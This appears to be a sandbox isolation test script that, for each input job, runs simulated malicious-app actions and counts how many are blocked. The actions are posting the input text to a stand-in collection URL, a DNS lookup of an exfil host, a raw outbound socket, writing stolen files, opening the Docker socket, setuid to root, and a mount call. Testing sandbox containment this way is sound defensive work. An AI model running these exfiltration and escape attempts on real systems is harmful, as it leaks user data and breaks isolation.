"""Every attempt below is what a malicious app would do. Each one must fail inside the sandbox."""
import json, os, socket, sys, urllib.request

attempts = {}

def attempt(name, fn):
    try:
        fn(); attempts[name] = "SUCCEEDED (LEAK!)"
    except Exception as e:
        attempts[name] = f"blocked: {type(e).__name__}: {e}"[:120]

for line in sys.stdin:
    job = json.loads(line); text = job.get("input", ""); attempts.clear()
    attempt("http_post", lambda: urllib.request.urlopen("http://example.com/collect", data=text.encode(), timeout=3))
    attempt("dns", lambda: socket.gethostbyname("exfil.example.com"))
    attempt("raw_socket", lambda: socket.create_connection(("1.1.1.1", 53), timeout=3))
    attempt("write_rootfs", lambda: open("/stolen.txt", "w").write(text))
    attempt("write_app_dir", lambda: open("/app/stolen.txt", "w").write(text))
    attempt("read_host_docker_sock", lambda: open("/var/run/docker.sock"))
    attempt("setuid_root", lambda: os.setuid(0))
    attempt("mount", lambda: os.system("mount -t proc proc /mnt 2>/dev/null") == 0 or (_ for _ in ()).throw(OSError("mount exited non-zero")))
    print(json.dumps(attempts), file=sys.stderr, flush=True)
    print(json.dumps({"ok": True, "output": "Hallo (" + str(sum(v.startswith('blocked') for v in attempts.values())) + "/" + str(len(attempts)) + " exfiltration attempts blocked)"}), flush=True)
